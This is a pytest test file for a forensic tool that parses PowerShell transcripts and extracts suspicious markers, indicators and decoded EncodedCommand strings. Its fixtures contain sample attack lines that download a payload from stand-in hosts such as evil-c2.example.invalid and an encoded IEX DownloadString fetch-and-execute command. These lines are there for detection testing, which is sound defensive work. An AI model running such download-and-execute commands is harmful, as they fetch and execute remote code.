"""Targeted unit + regression tests for parse_powershell_transcripts.

Covers honest-negative behavior, header parsing, suspicious-marker /
indicator extraction, EncodedCommand decoding, binary/oversize skip
semantics, deterministic output, and registry/MCP exposure.
"""
from __future__ import annotations

import base64
import inspect
import textwrap
from pathlib import Path

import pytest

from sift_sentinel.tools.parse_powershell_transcripts import (
    parse_powershell_transcripts,
)


# ── helpers ────────────────────────────────────────────────────────────


def _make_user_dir(tmp_path: Path, user: str = "sqlsvc") -> Path:
    user_dir = tmp_path / "Users" / user
    (user_dir / "Documents").mkdir(parents=True)
    (user_dir / "Desktop").mkdir(parents=True)
    (user_dir / "Downloads").mkdir(parents=True)
    (user_dir / "AppData" / "Local" / "Temp").mkdir(parents=True)
    (user_dir / "AppData" / "Roaming").mkdir(parents=True)
    return user_dir


def _make_transcript_file(
    user_dir: Path,
    name: str = "PowerShell_transcript.WINSRV01.20180905.txt",
    *,
    body: str | None = None,
) -> Path:
    if body is None:
        body = textwrap.dedent(
            """\
            **********************
            Windows PowerShell transcript start
            Start time: 20180905170245
            Username: WORKGROUP\\sqlsvc
            RunAs User: WORKGROUP\\sqlsvc
            Machine: WINSRV01 (Microsoft Windows NT 10.0.14393.0)
            Host Application: powershell.exe -NoProfile -Command "Get-ChildItem"
            Process ID: 4242
            **********************
            20180905170245 PS C:\\Users\\sqlsvc> Invoke-WebRequest http://evil-c2.example.invalid/sample_payload.exe -OutFile C:\\Windows\\Temp\\payload.bat
            20180905170301 PS C:\\Users\\sqlsvc> Enter-PSSession -ComputerName TEST-DC -Credential admin
            20180905170422 PS C:\\Users\\sqlsvc> Get-ChildItem
            **********************
            End time: 20180905170600
            **********************
            """
        )
    target = user_dir / "Documents" / name
    target.write_text(body, encoding="utf-8")
    return target


# ── honest-negative behavior ───────────────────────────────────────────


class TestHonestNegative:
    def test_missing_disk_mount_returns_no_transcripts(self, tmp_path):
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path / "does-not-exist")
        )
        assert result["record_count"] == 0
        assert result["records"] == []
        assert result["candidate_files"] == []
        assert result["searched_paths"] == []
        assert result["status"] == "no_transcripts_found"
        assert "disk mount not found" in result["reason"]
        assert result["errors"] == []
        assert result["output"] == []

    def test_empty_disk_returns_no_transcripts(self, tmp_path):
        # Mount exists but no Users/ or ProgramData/ directories.
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["record_count"] == 0
        assert result["records"] == []
        assert result["candidate_files"] == []
        assert result["searched_paths"] == []
        assert result["status"] == "no_transcripts_found"
        assert "no transcript-shaped files" in result["reason"]

    def test_searched_paths_populated_when_users_dir_exists(self, tmp_path):
        _make_user_dir(tmp_path)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["status"] == "no_transcripts_found"
        assert result["candidate_files"] == []
        assert result["searched_paths"], (
            "searched_paths must be populated when Users/ exists"
        )
        # Must include each of the user subdirectories we declare
        joined = "\n".join(result["searched_paths"])
        for sub in ("Documents", "Desktop", "Downloads",
                    "AppData/Local/Temp", "AppData/Roaming"):
            assert sub.replace("/", "/") in joined or sub in joined

    def test_candidate_without_transcript_header_returns_zero(self, tmp_path):
        """A *.txt file with no PS header and no signal -> 0 records."""
        user_dir = _make_user_dir(tmp_path)
        plain = user_dir / "Documents" / "notes.txt"
        plain.write_text("just a normal note\nnothing to see\n", encoding="utf-8")
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["record_count"] == 0
        assert plain.as_posix() in [Path(p).as_posix() for p in result["candidate_files"]]
        assert result["status"] == "no_transcripts_found"
        assert "candidate file" in result["reason"]


# ── transcript header parsing ──────────────────────────────────────────


class TestHeaderParsing:
    def test_header_record_has_required_fields(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        transcript = _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["record_count"] >= 1
        headers = [r for r in result["records"]
                   if r["type"] == "transcript_header"]
        assert len(headers) == 1
        h = headers[0]
        assert h["host_application"].startswith("powershell.exe")
        assert "sqlsvc" in (h["user"] or "")
        # Start time captured (raw form acceptable)
        assert h["timestamp"]
        assert "20180905170245" in h["timestamp"]
        assert h["computer"]
        assert h["end_time"]
        assert h["source_file"] == str(transcript)
        assert h["raw_excerpt"]

    def test_header_emits_high_confidence_when_markers_present(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        headers = [r for r in result["records"]
                   if r["type"] == "transcript_header"]
        assert headers
        # The default body has Enter-PSSession, Invoke-WebRequest -> markers
        # Confidence should not be LOW.
        assert headers[0]["confidence"] in ("MEDIUM", "HIGH")


# ── suspicious commands + indicator extraction ─────────────────────────


class TestSuspiciousCommands:
    def test_suspicious_command_record_emitted(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        commands = [r for r in result["records"] if r["type"] == "command"]
        assert commands, "expected per-line command records"
        joined_markers = sorted({m for r in commands for m in r["suspicious_markers"]})
        assert "Enter-PSSession" in joined_markers
        # Squirrel domain marker should also surface
        assert any(
            "evil-c2.example.invalid" in r["command"]
            or "evil-c2.example.invalid" in (r.get("decoded_command") or "")
            for r in commands
        )

    def test_indicators_extracted(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        body = textwrap.dedent(
            """\
            **********************
            Windows PowerShell transcript start
            Start time: 20180905170245
            Username: lab\\sqlsvc
            RunAs User: lab\\sqlsvc
            Machine: WINSRV01
            Host Application: powershell.exe
            **********************
            20180905170245 PS C:\\Users\\sqlsvc> iwr https://example.com/payload.bin -OutFile C:\\Windows\\Temp\\payload.bat
            20180905170301 PS C:\\Users\\sqlsvc> Test-NetConnection 192.0.2.35 -Port 443
            20180905170410 PS C:\\Users\\sqlsvc> Get-ChildItem
            **********************
            End time: 20180905170600
            """
        )
        _make_transcript_file(user_dir, body=body)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        commands = [r for r in result["records"] if r["type"] == "command"]
        urls = sorted({u for r in commands for u in r["urls"]})
        ips = sorted({i for r in commands for i in r["ips"]})
        domains = sorted({d for r in commands for d in r["domains"]})
        paths = sorted({p for r in commands for p in r["paths"]})
        assert any("example.com/payload.bin" in u for u in urls)
        assert "192.0.2.35" in ips
        assert "example.com" in domains
        assert any(p.lower() == r"c:\windows\temp\payload.bat" for p in paths)


# ── EncodedCommand decoding ────────────────────────────────────────────


def _ps_encode(plaintext: str) -> str:
    return base64.b64encode(plaintext.encode("utf-16-le")).decode("ascii")


class TestEncodedCommand:
    def test_valid_encoded_command_decodes(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        plaintext = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')"
        b64 = _ps_encode(plaintext)
        body = textwrap.dedent(
            f"""\
            **********************
            Windows PowerShell transcript start
            Start time: 20180905170245
            Username: lab\\sqlsvc
            RunAs User: lab\\sqlsvc
            Machine: WINSRV01
            Host Application: powershell.exe
            **********************
            20180905170245 PS C:\\> powershell -EncodedCommand {b64}
            **********************
            End time: 20180905170600
            """
        )
        _make_transcript_file(user_dir, body=body)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        commands = [r for r in result["records"] if r["type"] == "command"]
        decoded = [r for r in commands if r["decoded_command"]]
        assert decoded, "expected at least one decoded command"
        assert plaintext in decoded[0]["decoded_command"]
        # Inner indicators must surface as well
        assert any("evil.example" in d for d in decoded[0]["domains"])
        assert any("IEX" in m or "Invoke-Expression" in m
                   for m in decoded[0]["suspicious_markers"])

    def test_invalid_encoded_command_does_not_crash(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        bad_b64 = "!!!not-base64!!!"
        body = textwrap.dedent(
            f"""\
            **********************
            Windows PowerShell transcript start
            Start time: 20180905170245
            Username: lab\\sqlsvc
            RunAs User: lab\\sqlsvc
            Machine: WINSRV01
            Host Application: powershell.exe
            **********************
            20180905170245 PS C:\\> powershell -enc {bad_b64}
            **********************
            End time: 20180905170600
            """
        )
        _make_transcript_file(user_dir, body=body)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        commands = [r for r in result["records"] if r["type"] == "command"]
        # Should still produce a record (markers may match) but no decode
        if commands:
            for r in commands:
                if "-enc" in r["command"].lower():
                    assert r["decoded_command"] is None


# ── binary / oversize skip ─────────────────────────────────────────────


class TestSkipPolicy:
    def test_binary_file_skipped(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        binary = user_dir / "Documents" / "PowerShell_dump.txt"
        binary.write_bytes(b"\x00\x01\x02\x03" * 200)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert all(
            r["source_file"] != str(binary) for r in result["records"]
        )
        assert any("skip binary" in e for e in result["errors"])

    def test_oversize_file_skipped(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        big = user_dir / "Documents" / "PowerShell_huge.log"
        big.write_text("a" * 4096, encoding="utf-8")
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path), max_bytes_per_file=512,
        )
        assert all(r["source_file"] != str(big) for r in result["records"])
        assert any("skip oversize" in e for e in result["errors"])

    def test_excluded_fragments_not_walked(self, tmp_path):
        # Create a transcript-shaped file under a path that should be
        # excluded (System32 binary tree). It must not yield records.
        excluded = tmp_path / "Windows" / "System32" / "WindowsPowerShell"
        excluded.mkdir(parents=True)
        (excluded / "transcript.txt").write_text(
            "Host Application: powershell\nRunAs User: SYSTEM\n",
            encoding="utf-8",
        )
        # And no Users/ProgramData entry points
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["candidate_files"] == []
        assert result["status"] == "no_transcripts_found"

    def test_max_files_caps_candidate_count(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        for i in range(20):
            (user_dir / "Documents" / f"transcript_{i:03d}.txt").write_text(
                "noise\n", encoding="utf-8",
            )
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path), max_files=5,
        )
        assert len(result["candidate_files"]) <= 5


# ── output shape + determinism ─────────────────────────────────────────


class TestOutputShape:
    def test_envelope_keys(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        for key in (
            "tool", "tool_name", "evidence_path", "record_count",
            "records", "candidate_files", "searched_paths",
            "status", "reason", "errors", "output",
        ):
            assert key in result, f"missing envelope key: {key}"
        assert result["tool"] == "parse_powershell_transcripts"
        assert result["tool_name"] == "parse_powershell_transcripts"

    def test_output_mirrors_records(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["output"] == result["records"]
        assert result["record_count"] == len(result["records"])

    def test_every_record_has_source_file_and_raw_excerpt(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["records"]
        for r in result["records"]:
            assert r.get("source_file"), r
            assert r.get("raw_excerpt"), r
            assert r.get("type") in (
                "transcript_header", "command", "transcript_event",
            )

    def test_output_is_deterministic(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir, name="PowerShell_transcript.A.txt")
        _make_transcript_file(user_dir, name="PowerShell_transcript.B.txt")
        first = parse_powershell_transcripts(disk_mount=str(tmp_path))
        second = parse_powershell_transcripts(disk_mount=str(tmp_path))
        # Drop the records list ordering check by comparing JSON-stable form.
        assert first["records"] == second["records"]
        assert first["candidate_files"] == second["candidate_files"]
        assert first["searched_paths"] == second["searched_paths"]
        assert first["status"] == second["status"]


# ── registry / capability / MCP exposure ───────────────────────────────


class TestRegistryExposure:
    def test_registered_in_tool_registry(self):
        from sift_sentinel.coordinator import _TOOL_REGISTRY
        assert "parse_powershell_transcripts" in _TOOL_REGISTRY
        fn, arg_type = _TOOL_REGISTRY["parse_powershell_transcripts"]
        assert callable(fn)
        assert arg_type == "standalone"

    def test_capability_declared(self):
        from sift_sentinel.tools.capabilities import get_capability
        cap = get_capability("parse_powershell_transcripts")
        assert cap is not None
        assert "windows_evidence" in cap["applicable_when"]
        assert "disk_evidence" in cap["applicable_when"]
        assert "linux_evidence" in cap["not_applicable_when"]
        assert cap["runtime_class"] in {"fast", "medium", "slow", "background"}
        assert cap["produces"] == ["powershell_transcript_records"]

    def test_categorized_as_execution_history(self):
        from sift_sentinel.coordinator import _TOOL_CATEGORY
        assert _TOOL_CATEGORY.get("parse_powershell_transcripts") == \
            "execution_history"

    def test_appears_in_inv1_prompt(self, tmp_path):
        from sift_sentinel.coordinator import (
            BOOTSTRAP_TOOLS, build_inv1_prompt,
        )
        bootstrap = {
            n: {"tool_name": n, "output": [], "record_count": 0}
            for n in BOOTSTRAP_TOOLS
        }
        prompt = build_inv1_prompt(bootstrap, tmp_path).read_text()
        assert "parse_powershell_transcripts" in prompt

    def test_listed_in_investigation_tools(self):
        from sift_sentinel.coordinator import INVESTIGATION_TOOLS
        assert "parse_powershell_transcripts" in INVESTIGATION_TOOLS

    def test_listed_in_disk_tools(self):
        from sift_sentinel.coordinator import DISK_TOOLS as COORD_DISK_TOOLS
        from sift_sentinel.analysis.confidence import (
            DISK_TOOLS as CONF_DISK_TOOLS,
        )
        from sift_sentinel.console import DISK_TOOLS as CONSOLE_DISK_TOOLS
        assert "parse_powershell_transcripts" in COORD_DISK_TOOLS
        assert "parse_powershell_transcripts" in CONF_DISK_TOOLS
        assert "parse_powershell_transcripts" in CONSOLE_DISK_TOOLS

    def test_artifact_type_classified_as_event_log(self):
        from sift_sentinel.analysis.confidence import TOOL_TO_ARTIFACT_TYPE
        # "E" means event-log/PS-transcript class artifact
        assert TOOL_TO_ARTIFACT_TYPE.get("parse_powershell_transcripts") == "E"

    def test_mcp_server_exposes_tool(self):
        import sys
        if "server" in sys.modules:
            del sys.modules["server"]
        sys.path.insert(0, "src")
        import server
        assert hasattr(server, "tool_parse_powershell_transcripts")
        assert callable(getattr(server, "tool_parse_powershell_transcripts"))
        # Underlying _tool_manager registration
        assert "tool_parse_powershell_transcripts" in \
            server.mcp._tool_manager._tools

    def test_signature_accepts_standalone_call(self):
        sig = inspect.signature(parse_powershell_transcripts)
        # Must be callable with no positional args (the standalone arg_type
        # contract in coordinator.run_tool dispatches via fn()).
        assert all(
            p.default is not inspect.Parameter.empty
            or p.kind in (
                inspect.Parameter.VAR_POSITIONAL,
                inspect.Parameter.VAR_KEYWORD,
            )
            for p in sig.parameters.values()
        )


# ── dispatch via run_tool ──────────────────────────────────────────────


class TestRunToolDispatch:
    def test_run_tool_returns_envelope(self, tmp_path, monkeypatch):
        from sift_sentinel.coordinator import (
            new_tool_health, run_tool,
        )
        from sift_sentinel.tools import (
            parse_powershell_transcripts as ppt_module,
        )
        # Force the tool to look at our temp tree, not the live mount.
        monkeypatch.setattr(ppt_module, "DISK_MOUNT_PATH", str(tmp_path))
        new_tool_health()
        result = run_tool(
            "parse_powershell_transcripts",
            image_path="",
            disk_path="",
        )
        assert result["tool_name"] == "parse_powershell_transcripts"
        assert result["status"] == "no_transcripts_found"
        assert result["record_count"] == 0
        assert isinstance(result["records"], list)


# ── F6-B recovery_hints (closed schema) ───────────────────────────────


from sift_sentinel.tools.parse_powershell_transcripts import (
    RECOVERY_HINT_REQUIRED_FIELDS,
    RECOVERY_HINT_STATUSES,
    RECOVERY_HINT_TYPES,
    RECOVERY_STATUSES,
)


# Locked vocabulary from the F6-B contract. Tests pin against these so
# any drift in the production constants surfaces here immediately.
_EXPECTED_STATUSES = frozenset({
    "no_transcripts_found",
    "transcript_references_found",
    "transcripts_parsed",
    "transcripts_parsed_with_references",
})
_EXPECTED_HINT_TYPES = frozenset({
    "transcript_path_reference",
    "transcript_host_application_reference",
})
_EXPECTED_HINT_STATUSES = frozenset({
    "path_reference_only",
    "host_application_reference",
})
_EXPECTED_REQUIRED_FIELDS = (
    "type",
    "status",
    "transcript_path",
    "user",
    "date_dir",
    "host_application",
    "source_tool",
    "source_file",
    "raw_excerpt",
    "reason",
)


class TestClosedVocabularyConstants:
    """Pin the closed F6-B contract -- no drift permitted without an
    explicit schema bump."""

    def test_envelope_status_vocab_is_locked(self):
        assert RECOVERY_STATUSES == _EXPECTED_STATUSES

    def test_hint_type_vocab_is_locked(self):
        assert RECOVERY_HINT_TYPES == _EXPECTED_HINT_TYPES

    def test_hint_status_vocab_is_locked(self):
        assert RECOVERY_HINT_STATUSES == _EXPECTED_HINT_STATUSES

    def test_required_fields_locked(self):
        assert RECOVERY_HINT_REQUIRED_FIELDS == _EXPECTED_REQUIRED_FIELDS


class TestFindTranscriptRecoveryHints:
    """Unit tests for the public ``find_transcript_recovery_hints`` helper.

    Detection is dataset-agnostic: it relies only on PowerShell's standard
    transcript filename convention and the literal ``HostApplication`` /
    ``wsmprovhost.exe`` tokens. No scenario-specific identifiers leak into
    the production module (verified by ``test_no_dataset_specific_strings``).
    """

    # ── empty / malformed inputs ───────────────────────────────────────

    def test_returns_empty_list_for_none(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        assert find_transcript_recovery_hints(None) == []

    def test_returns_empty_list_for_non_dict(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        for bad in ("not a dict", 42, [], (), 1.5):
            assert find_transcript_recovery_hints(bad) == []

    def test_returns_empty_list_for_empty_dict(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        assert find_transcript_recovery_hints({}) == []

    def test_handles_malformed_envelope_gracefully(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        for malformed in (
            {"x": None},
            {"x": "string"},
            {"x": 42},
            {"x": {"output": "not-a-list"}},
            {"x": {"output": None}},
            {"x": {}},
        ):
            assert find_transcript_recovery_hints(malformed) == []

    def test_handles_non_dict_records_gracefully(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {
            "output": [
                None, "string-record", 42, ["list-record"],
                {"Name": r"\Users\u\PowerShell_transcript.A.B.C.txt"},
            ],
        }
        hints = find_transcript_recovery_hints({"x": envelope})
        assert len(hints) == 1
        assert hints[0]["type"] == "transcript_path_reference"

    # ── path hint extraction ───────────────────────────────────────────

    def test_extracts_path_hint_from_filescan_style(self):
        """Volatility-style envelope: Name carries a backslash path."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {
            "tool_name": "vol_filescan",
            "output": [
                {"Name": r"\Users\analyst\Documents\20240101\PowerShell_transcript.HOST_X.AbCd1234.20240101120000.txt",
                 "Offset": 12345, "TreeDepth": 0},
                {"Name": r"\Windows\System32\notepad.exe",
                 "Offset": 23456, "TreeDepth": 0},
            ],
        }
        hints = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert len(hints) == 1
        h = hints[0]
        assert h["type"] == "transcript_path_reference"
        assert h["status"] == "path_reference_only"
        assert h["source_tool"] == "vol_filescan"
        assert h["source_file"] == "tool_outputs/vol_filescan.json"
        assert h["transcript_path"] == (
            "/Users/analyst/Documents/20240101/"
            "PowerShell_transcript.HOST_X.AbCd1234.20240101120000.txt"
        )
        assert h["user"] == "analyst"
        assert h["date_dir"] == "20240101"
        assert h["host_application"] is None
        assert h["raw_excerpt"]
        assert h["reason"] == \
            "PowerShell transcript path referenced in tool output"

    def test_extracts_path_hint_from_handles_style_with_device_prefix(self):
        """vol_handles: Name carries \\Device\\HarddiskVolumeN\\ prefix."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {
            "tool_name": "vol_handles",
            "output": [
                {"Name": r"\Device\HarddiskVolume2\Users\someuser\Documents\20231215\PowerShell_transcript.WS_7.zXyW9.20231215093000.txt",
                 "PID": 1234, "Process": "powershell.exe", "Type": "File",
                 "GrantedAccess": 1180063, "HandleValue": 100,
                 "Offset": 99, "TreeDepth": 0},
            ],
        }
        hints = find_transcript_recovery_hints({"vol_handles": envelope})
        assert len(hints) == 1
        h = hints[0]
        assert h["type"] == "transcript_path_reference"
        assert h["transcript_path"] == (
            "/Users/someuser/Documents/20231215/"
            "PowerShell_transcript.WS_7.zXyW9.20231215093000.txt"
        )
        assert "Device" not in h["transcript_path"]
        assert "HarddiskVolume" not in h["transcript_path"]
        assert h["user"] == "someuser"
        assert h["date_dir"] == "20231215"
        assert h["source_file"] == "tool_outputs/vol_handles.json"

    def test_path_hint_required_fields_present(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\u\Documents\20240101\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        hints = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert len(hints) == 1
        h = hints[0]
        for field in _EXPECTED_REQUIRED_FIELDS:
            assert field in h, f"missing required field: {field}"

    def test_path_hint_uses_closed_type_and_status_vocab(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\u\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        hints = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert hints[0]["type"] in _EXPECTED_HINT_TYPES
        assert hints[0]["status"] in _EXPECTED_HINT_STATUSES
        assert hints[0]["type"] == "transcript_path_reference"
        assert hints[0]["status"] == "path_reference_only"

    def test_path_hint_normalizes_drive_letter(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Path": r"C:\Users\testuser\Documents\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        hints = find_transcript_recovery_hints({"some_tool": envelope})
        assert len(hints) == 1
        assert hints[0]["transcript_path"].startswith("C:/")
        assert "\\" not in hints[0]["transcript_path"]

    def test_path_hint_normalizes_unc(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Path": r"\\fileserver\share\transcripts\PowerShell_transcript.X.Y.Z.log"},
        ]}
        hints = find_transcript_recovery_hints({"smb_walker": envelope})
        assert len(hints) == 1
        assert "fileserver" in hints[0]["transcript_path"]
        assert hints[0]["transcript_path"].endswith(".log")

    def test_path_hint_recognizes_log_extension(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\some\path\PowerShell_transcript.Foo.Bar.20240101.log"},
        ]}
        hints = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert len(hints) == 1
        assert hints[0]["transcript_path"].endswith(".log")

    def test_path_hint_extracts_from_message_field(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [{
            "EventID": 4103,
            "TimeCreated": "2024-01-01T12:00:00Z",
            "Provider": "Microsoft-Windows-PowerShell",
            "Message": (
                "Start-Transcript -Path "
                r"C:\Users\analyst\Documents\20240101\PowerShell_transcript.HOSTX.aaaaaa.20240101120000.txt"
                " other text after"
            ),
        }]}
        hints = find_transcript_recovery_hints(
            {"parse_event_logs": envelope},
        )
        assert len(hints) == 1
        h = hints[0]
        assert h["type"] == "transcript_path_reference"
        assert h["transcript_path"] == (
            "C:/Users/analyst/Documents/20240101/"
            "PowerShell_transcript.HOSTX.aaaaaa.20240101120000.txt"
        )
        assert h["date_dir"] == "20240101"
        # raw_excerpt may include surrounding text from the Message
        # but transcript_path must be a clean path with no message tokens
        assert "other text" not in h["transcript_path"]
        assert "Start-Transcript" not in h["transcript_path"]

    def test_records_without_path_field_yield_no_hint(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"PID": 1234, "Process": "explorer.exe", "Foo": "bar"},
        ]}
        assert find_transcript_recovery_hints({"vol_psscan": envelope}) == []

    def test_non_transcript_paths_ignored(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\analyst\Documents\notes.txt"},
            {"Name": r"\Windows\System32\cmd.exe"},
            {"Name": r"\Users\analyst\Desktop\screenshot.png"},
        ]}
        assert find_transcript_recovery_hints({"vol_filescan": envelope}) == []

    def test_path_hint_dedup_within_same_tool_and_path(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        path = r"\Users\analyst\Documents\PowerShell_transcript.X.Y.Z.txt"
        envelope = {"output": [
            {"Name": path, "Offset": 1},
            {"Name": path, "Offset": 2},
            {"Name": path, "Offset": 3},
        ]}
        hints = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert len(hints) == 1

    def test_distinct_tools_yield_separate_path_hints(self):
        """Same path observed by two tools is recorded twice
        (cross-tool corroboration)."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        path_filescan = (
            r"\Users\u\Documents\PowerShell_transcript.X.Y.Z.txt"
        )
        path_handles = (
            r"\Device\HarddiskVolume2\Users\u\Documents"
            r"\PowerShell_transcript.X.Y.Z.txt"
        )
        env_fs = {"output": [{"Name": path_filescan}]}
        env_h = {"output": [{
            "Name": path_handles, "PID": 1, "Process": "powershell.exe",
        }]}
        hints = find_transcript_recovery_hints({
            "vol_filescan": env_fs, "vol_handles": env_h,
        })
        tools_seen = sorted({h["source_tool"] for h in hints})
        assert tools_seen == ["vol_filescan", "vol_handles"]
        assert len(hints) == 2
        # Both normalize to the same canonical path
        normalized = {h["transcript_path"] for h in hints}
        assert len(normalized) == 1

    def test_supports_records_key(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"records": [
            {"Name": r"\Users\u\PowerShell_transcript.A.B.C.txt"},
        ]}
        hints = find_transcript_recovery_hints({"some_tool": envelope})
        assert len(hints) == 1
        assert hints[0]["type"] == "transcript_path_reference"

    def test_supports_data_key(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"data": [
            {"Name": r"\Users\u\PowerShell_transcript.A.B.C.txt"},
        ]}
        hints = find_transcript_recovery_hints({"some_tool": envelope})
        assert len(hints) == 1
        assert hints[0]["type"] == "transcript_path_reference"

    # ── user / date_dir extraction ─────────────────────────────────────

    def test_user_extracted_from_path_when_present(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\bob\Documents\PowerShell_transcript.A.B.C.txt"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints[0]["user"] == "bob"

    def test_user_none_when_path_has_no_users_dir(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\ProgramData\Logs\PowerShell_transcript.A.B.C.txt"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints[0]["user"] is None

    def test_date_dir_extracted_from_8_digit_segment(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\u\Documents\20240615\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints[0]["date_dir"] == "20240615"

    def test_date_dir_null_when_no_date_segment(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\u\Documents\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints[0]["date_dir"] is None

    def test_date_dir_does_not_match_basename_digits(self):
        """An 8-digit token in the basename (not as a path segment)
        must not be treated as a date_dir."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\u\Documents\PowerShell_transcript.HOST.XYZ.20240615120000.txt"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints[0]["date_dir"] is None

    # ── HostApplication-only hint ──────────────────────────────────────

    def test_host_application_only_hint_when_no_path(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [{
            "EventID": 4103,
            "Message": (
                "Provider=PSEvents "
                r"HostApplication=C:\Windows\System32\wsmprovhost.exe -Embedding "
                "ParentRunSpaceID=abc123"
            ),
        }]}
        hints = find_transcript_recovery_hints(
            {"parse_event_logs": envelope},
        )
        assert len(hints) == 1
        h = hints[0]
        assert h["type"] == "transcript_host_application_reference"
        assert h["status"] == "host_application_reference"
        assert h["transcript_path"] is None
        assert h["user"] is None
        assert h["date_dir"] is None
        assert "wsmprovhost.exe" in h["host_application"]

    def test_host_application_hint_required_fields(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Message": "HostApplication=wsmprovhost.exe -Embedding"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert len(hints) == 1
        for field in _EXPECTED_REQUIRED_FIELDS:
            assert field in hints[0], f"missing required field: {field}"

    def test_host_application_hint_carries_full_value(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [{
            "Message": "HostApplication=wsmprovhost.exe -Embedding",
        }]}
        hints = find_transcript_recovery_hints(
            {"parse_event_logs": envelope},
        )
        assert hints[0]["host_application"] == \
